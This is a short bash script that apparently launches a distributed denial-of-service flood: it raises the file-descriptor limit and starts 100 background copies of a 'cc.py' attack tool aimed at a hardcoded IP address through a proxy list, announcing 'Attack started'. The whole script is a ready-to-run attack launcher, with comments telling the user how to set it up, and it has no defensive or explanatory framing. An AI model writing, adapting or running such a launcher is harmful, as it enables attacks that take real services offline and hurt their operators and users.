#!/bin/bash
#
#  Please prepared proxies list at first.
#  And then change the command in atk_cmd
#  And change the process number
#  Lastly run this script
#
#the command you want to exec
atk_cmd="python cc.py -url https://176.9.16.251 -f proxy.txt -v 4 -s 300 -t 2000"

#number of process that you want
process=100

#change the system limit
ulimit -n 9999999

echo Attack started
for ((i=1;i<=$process;i++))
do
  $atk_cmd >/dev/null &
  sleep 0.1
done
